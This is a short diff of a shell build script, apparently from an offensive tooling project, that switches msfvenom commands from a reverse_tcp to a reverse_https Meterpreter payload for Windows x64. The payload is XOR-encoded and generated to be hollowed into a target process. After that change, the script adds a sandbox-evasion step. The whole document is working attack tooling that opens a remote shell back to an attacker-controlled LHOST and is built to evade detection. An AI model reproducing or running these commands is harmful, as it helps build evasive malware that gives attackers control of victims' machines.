@@ -31,9 +31,9 @@ LHOST=$GLOBAL_LHOST
 printf "\n+++ Generating hollowing payload +++\n"
 
 # generate metasploit payload that will later be hollowed into the target process
-msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
+msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
 # unstaged variant for testing purposes
-#msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
+#msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt
 
 # add evasion techniques
 add_evasion fopen_sandbox_evasion
